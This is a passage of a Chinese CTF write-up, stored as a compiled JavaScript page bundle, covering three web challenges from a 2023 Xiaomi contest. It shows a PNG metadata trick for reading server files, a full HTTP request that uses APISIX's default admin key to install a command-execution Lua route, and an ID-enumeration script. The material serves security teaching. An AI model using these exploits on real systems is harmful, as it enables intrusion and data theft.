\u8FDC\u7A0B\u6587\u4EF6\u6CC4\u9732\u6F0F\u6D1E\u3002\u5177\u4F53\u6F0F\u6D1E\u5185\u5BB9\u5C31\u4E0D\u8BE6\u8FF0\u4E86\u3002\u4E0B\u9762\u8BF4\u5229\u7528\u8FC7\u7A0B\u3002"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"\u9996\u5148\u51C6\u5907\u4E00\u4E2A\u7A7A\u767D\u7684png\u7528\u4E8E\u4E0A\u4F20\u3002"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"89504E47 0D0A1A0A 0000000D 49484452 00000001 00000001 01000000 00376EF9 24000000 0A494441 54789C63 68000000 82008177 CD72B600 00000049 454E44AE 426082\n"})}),"\n",(0,i.jsxs)(n.ol,{start:"2",children:["\n",(0,i.jsx)(n.li,{children:"\u7ED9png\u7684exif\u5199\u5165profile\u548C\u6587\u4EF6\u8DEF\u5F84\uFF0C\u7528\u4E8E\u89E6\u53D1\u6587\u4EF6\u8BFB\u53D6\u3002"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",meta:"",children:'brew install pngcrush\npngcrush -text a "profile" "index.php" pngin.png\n'})}),"\n",(0,i.jsx)(n.p,{children:"profile\u662Fexif\u7684\u5C5E\u6027\u540D\uFF0Cindex.php\u662F\u8BFB\u53D6\u7684\u6587\u4EF6\u540D\u3002\n3. \u5C06\u6587\u4EF6\u4E0A\u4F20\u5230\u7F51\u7AD9\uFF0C\u628A\u5904\u7406\u540E\u7684\u6587\u4EF6\u4E0B\u8F7D\u4E0B\u6765\u3002\n4. \u89E3\u6790\u5904\u7406\u540E\u6587\u4EF6\u7684\u6570\u636E"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",meta:"",children:"brew install exif\nexiftool 645f4aeaa8285.png -b\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.img,{alt:"exif-tool",src:eb}),"\n5. \u628A\u8FD9\u6BB5\u4EE3\u7801\u7528hex\u89E3\u7801\uFF0C\u83B7\u53D6\u6587\u4EF6\u5185\u5BB9\uFF0C\u4ECE\u4E2D\u53EF\u4EE5\u627E\u5230flag\u3002\uFF08\u6CE8\u610F\u5F00\u5934\u7684862\u662F\u65E0\u7528\u7684\uFF0C\u4E0D\u8981\u8DDF\u540E\u9762\u7684\u5728\u4E00\u8D77\u89E3\u7801\u3002\uFF09\n",(0,i.jsx)(n.img,{alt:"result",src:ej})]}),"\n",(0,i.jsxs)(n.h3,{id:"web-31-\u5BC6\u94A5\u5BC6\u94A5\u4E0D\u80FD\u9ED8\u8BA4",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-31-\u5BC6\u94A5\u5BC6\u94A5\u4E0D\u80FD\u9ED8\u8BA4",children:"#"}),"web-31 \u5BC6\u94A5\uFF0C\u5BC6\u94A5\uFF0C\u4E0D\u80FD\u9ED8\u8BA4"]}),"\n",(0,i.jsx)(n.p,{children:"\u89C2\u5BDF\u7AEF\u53E39080\u548C\u8FD4\u56DE\u7684header-server\u6570\u636E\uFF0C\u5224\u65AD\u662F Apache APISIX\uFF0C\u901A\u8FC7\u641C\u7D22\u53D1\u73B0\u6709\u4E2A\u9ED8\u8BA4\u5BC6\u94A5\u6F0F\u6D1E CVE-2020-13945\u3002\u6784\u9020\u8BF7\u6C42\uFF0C\u6DFB\u52A0\u4EFB\u610F\u547D\u4EE4\u6267\u884C\u7684\u8DEF\u7531\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-http",meta:"request",children:'POST /apisix/admin/routes HTTP/1.1\nHost: 10.167.32.15:9080\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nX-API-KEY: edd1c9f034335f136f87ad84b625c8f1\nConnection: close\nContent-Length: 415\n\n{\n    "uri": "/hello/sumy.html",\n"script": "local _M = {} \\n function _M.access(conf, ctx) \\n local os = require(\'os\')\\n local args = assert(ngx.req.get_uri_args()) \\n local f = assert(io.popen(args.cmd, \'r\'))\\n local s = assert(f:read(\'*a\'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M",\n    "upstream": {\n        "type": "roundrobin",\n        "nodes": {\n            "example.com:80": 1\n        }\n    }\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540E\u8BBF\u95EE\u6267\u884C\u547D\u4EE4\uFF0C\u83B7\u53D6\u76EE\u5F55\u5185\u5BB9\uFF0C\u8FDB\u800C\u5F97\u5230flag"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"http://10.167.32.15:9080/hello/sumy.html?cmd=ls\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"web-32-actuator-404",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-32-actuator-404",children:"#"}),"web-32 Actuator 404"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u77E5\u9053\u662F\u627Eactuator\u7684\u7AEF\u70B9\uFF0C\u76F4\u63A5\u8BBF\u95EE\u662F\u8FD4\u56DE404\u3002\u731C\u6D4B\u7F3A\u5C11\u4E00\u4E2A\u8DEF\u5F84\u524D\u7F00\u3002\u626B\u4E86\u6240\u67093\u4F4D\u5B57\u7B26\u7684\u7EC4\u5408\u8DEF\u5F84/aaa/actuator/env\u6CA1\u53D1\u73B0\u6709\u5185\u5BB9\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:"==================\u5361\u4E86\u5F88\u4E45\u7684\u5206\u5272\u7EBF================="}),"\n",(0,i.jsx)(n.p,{children:"\u653E\u51FA\u4E86hint\uFF1A/xiaomi/management/"}),"\n",(0,i.jsx)(n.p,{children:"\u62FC\u63A5\u8DEF\u5F84/xiaomi/management/actuator/env\u627E\u5230\u4E86\u7AEF\u70B9\u3002\u7136\u540E\u5C31\u662F\u5404\u79CD\u7FFB\u627E\uFF0C\u5728/xiaomi/management/actuator/httptrace\u53D1\u73B0\u4E86\u4E00\u4E2A\u5947\u602A\u7684\u5730\u5740\u3002/xiaomi/ctf/api/v1/userInfo?id=1"}),"\n",(0,i.jsx)(n.p,{children:"\u904D\u5386id\uFF0C\u5728\u7B2C999\u4E2AID\u53D1\u73B0\u4E86flag\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",meta:"",children:"import requests\n\ndef requestUserInfo(id):\n    url = \"http://10.167.96.4:8080/xiaomi/ctf/api/v1/userInfo?id={}\".format(id)\n\n    payload = {}\n    headers = {\n        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',\n        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',\n        'Cache-Control': 'no-cache',\n        'Connection': 'keep-alive',\n        'Pragma': 'no-cache',\n        'Upgrade-Insecure-Requests': '1',\n        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'\n    }\n\n    response = requests.request(\"GET\", url, headers=headers, data=payload)\n\n    print(id)\n    print(response.json())\n\nfor i in range(600, 1000):\n    requestUserInfo(i)\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"result",src:eA})})]})}function ev(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},{wrapper:n}=Object.assign({},(0,r.useMDXComponents)(),e.components);return n?(0,i.jsx)(n,Object.assign({},e,{children:(0,i.jsx)(ew,e)})):ew(e)}n.default=ev,ev.__RSPRESS_PAGE_META={},ev.__RSPRESS_PAGE_META["..%2Fsource%2F_posts%2F2023-05-06-mi-ctf-2023-writeup%2F2023-05-06-mi-ctf-2023-writeup.md"]={toc:[{id:"iot",text:"IoT",depth:2},{id:"iot-1-cyber-pulse",text:"IoT-1 Cyber Pulse",depth:3},{id:"iot-2-debug",text:"IoT-2 Debug",depth:3},{id:"iot-3-pcb",text:"IoT-3 PCB",depth:3},{id:"iot-4-ble1",text:"IoT-4 BLE1",depth:3},{id:"iot-5-ble3",text:"IoT-5 BLE3",depth:3},{id:"iot-8-ble2",text:"IoT-8 BLE2",depth:3},{id:"iot-9-\u4F60\u7684wi-fi\u6D41\u91CF\u88AB\u76D1\u542C\u4E86\u4E48",text:"IoT-9 \u4F60\u7684Wi-Fi\u6D41\u91CF\u88AB\u76D1\u542C\u4E86\u4E48\uFF1F",depth:3},{id:"iot-10-7-segment",text:"IoT-10 7 segment",depth:3},{id:"misc",text:"Misc",depth:2},{id:"misc-1-\u7EA2\u7EBF\u7EA2\u7EBF\u7EA2\u7EBF",text:"misc-1 \u7EA2\u7EBF\uFF01\u7EA2\u7EBF\uFF01\u7EA2\u7EBF\uFF01",depth:3},{id:"misc-2-\u6709\u8DA3\u7684\u524D\u7AEF",text:"misc-2 \u6709\u8DA3\u7684\u524D\u7AEF",depth:3},{id:"misc-3-\u654F\u611F\u6570\u636E",text:"misc-3 \u654F\u611F\u6570\u636E",depth:3},{id:"misc-4-ez-forensics",text:"misc-4 ez forensics",depth:3},{id:"misc-5-chatgpt",text:"misc-5 ChatGPT",depth:3},{id:"misc-6-\u5F26\u5916\u4E4B\u97F3",text:"misc-6 \u5F26\u5916\u4E4B\u97F3",depth:3},{id:"mobile",text:"Mobile",depth:2},{id:"mobile-1-ba5e64",text:"mobile-1 ba5e64",depth:3},{id:"mobile-2-xor",text:"mobile-2 xor",depth:3},{id:"mobile-3-maze",text:"mobile-3 MAZE",depth:3},{id:"mobile-4-\u91CD\u5B9A\u5411\u521D\u63A2",text:"mobile-4 \u91CD\u5B9A\u5411\u521D\u63A2",depth:3},{id:"mobile-5-\u6570\u5B66\u5BB6",text:"mobile-5 \u6570\u5B66\u5BB6",depth:3},{id:"mobile-6-\u591A\u5C11\u4E2Amd5",text:"mobile-6 \u591A\u5C11\u4E2AMD5",depth:3},{id:"mobile-7-pdd",text:"mobile-7 pdd",depth:3},{id:"mobile-9-bqq",text:"mobile-9 bqq",depth:3},{id:"mobile-10-vm",text:"mobile-10 VM",depth:3},{id:"mobile-11-\u91CD\u5B9A\u5411\u8FDB\u9636",text:"mobile-11 \u91CD\u5B9A\u5411\u8FDB\u9636",depth:3},{id:"web",text:"Web",depth:2},{id:"web-1-\u804A\u5929\u5BA4",text:"web-1 \u804A\u5929\u5BA4",depth:3},{id:"web-2-\u98CE\u9669\u7EC4\u4EF6",text:"web-2 \u98CE\u9669\u7EC4\u4EF6",depth:3},{id:"web-3-\u7B80\u5355\u6587\u4EF6\u5305\u542B",text:"web-3 \u7B80\u5355\u6587\u4EF6\u5305\u542B",depth:3},{id:"web-4-\u4E0D\u5B89\u5168\u7684redis\u670D\u52A1",text:"web-4 \u4E0D\u5B89\u5168\u7684Redis\u670D\u52A1",depth:3},{id:"web-5-\u771F\u5047\u96BE\u8FA8",text:"web-5 \u771F\u5047\u96BE\u8FA8",depth:3},{id:"web-6-\u4F4E\u7248\u672C\u7684flask",text:"web-6 \u4F4E\u7248\u672C\u7684Flask",depth:3},{id:"web-7-\u7C97\u5FC3\u4E0A\u7EBF",text:"web-7 \u7C97\u5FC3\u4E0A\u7EBF",depth:3},{id:"web-8-elasticsearch",text:"web-8 ElasticSearch",depth:3},{id:"web-9-\u624D\u5F00\u59CB\u5B66nginx",text:"web-9 \u624D\u5F00\u59CB\u5B66nginx",depth:3},{id:"web-10-\u6807\u51C6\u6A21\u677F\u6B22\u8FCE\u5149\u4E34",text:"web-10 \u6807\u51C6\u6A21\u677F\uFF1A\u6B22\u8FCE\u5149\u4E34",depth:3},{id:"web-11-unserialize",text:"web-11 unserialize",depth:3},{id:"web-12-\u4E0D\u5B89\u5168\u7684\u4EE3\u7406\u670D\u52A1",text:"web-12 \u4E0D\u5B89\u5168\u7684\u4EE3\u7406\u670D\u52A1",depth:3},{id:"web-13-php-audit",text:"web-13 php-audit",depth:3},{id:"web-14-jenkins",text:"web-14 jenkins",depth:3},{id:"web-15-\u4E00\u4E2Ablog",text:"web-15 \u4E00\u4E2Ablog",depth:3},{id:"web-16-\u8BA4\u8BC1\u7ED5\u8FC7",text:"web-16 \u8BA4\u8BC1\u7ED5\u8FC7",depth:3},{id:"web-17-\u6587\u4EF6\u89E3\u6790\u5668",text:"web-17 \u6587\u4EF6\u89E3\u6790\u5668",depth:3},{id:"web-18-self-gpt---1",text:"web-18 SELF GPT - 1",depth:3},{id:"web-19-\u7C97\u5FC3\u7684\u7A0B\u5E8F\u5458",text:"web-19 \u7C97\u5FC3\u7684\u7A0B\u5E8F\u5458\uFF01",depth:3},{id:"web-21-\u4E00\u4E2A\u7F51\u7EDC\u6D4B\u8BD5\u5DE5\u5177",text:"web-21 \u4E00\u4E2A\u7F51\u7EDC\u6D4B\u8BD5\u5DE5\u5177",depth:3},{id:"web-22-\u6587\u4EF6\u9884\u89C8\u670D\u52A1\u5668",text:"web-22 \u6587\u4EF6\u9884\u89C8\u670D\u52A1\u5668",depth:3},{id:"web-23-php-is-best",text:"web-23 PHP IS BEST",depth:3},{id:"web-24-\u7B80\u7EA6\u4F46\u4E0D\u7B80\u5355",text:"web-24 \u7B80\u7EA6\u4F46\u4E0D\u7B80\u5355",depth:3},{id:"web-25-\u795E\u5947\u7684\u8BA1\u7B97\u5668",text:"web-25 \u795E\u5947\u7684\u8BA1\u7B97\u5668",depth:3},{id:"web-26-\u5929\u5973\u6563\u82B1",text:"web-26 \u5929\u5973\u6563\u82B1",depth:3},{id:"web-27-\u60F3\u83B7\u53D6flag\u5417",text:"web-27 \u60F3\u83B7\u53D6flag\u5417",depth:3},{id:"web-28-\u795E\u5947\u7684\u9B54\u65B9",text:"web-28 \u795E\u5947\u7684\u9B54\u65B9",depth:3},{id:"web-29-\u62FF\u5230\u7BA1\u7406\u5458\u6743\u9650\u5C31\u80FD\u5F97\u5230flag\u5566",text:"web-29 \u62FF\u5230\u7BA1\u7406\u5458\u6743\u9650\u5C31\u80FD\u5F97\u5230flag\u5566\uFF01",depth:3},{id:"web-30-\u9B54\u6CD5\u518D\u73B0",text:"web-30 \u9B54\u6CD5\u518D\u73B0",depth:3},{id:"web-31-\u5BC6\u94A5\u5BC6\u94A5\u4E0D\u80FD\u9ED8\u8BA4",text:"web-31 \u5BC6\u94A5\uFF0C\u5BC6\u94A5\uFF0C\u4E0D\u80FD\u9ED8\u8BA4",depth:3},{id:"web-32-actuator-404",text:"web-32 Actuator 404",depth:3}],title:"\u5C0F\u7C732023CTF\u5B89\u5168\u8D5B\u9053writeup",frontmatter:{layout:"post",title:"\u5C0F\u7C732023CTF\u5B89\u5168\u8D5B\u9053writeup",date:"2023-05-06T12:00:00.000Z",categories:["CTF"],tags:["CTF","writeup"]}}}}]);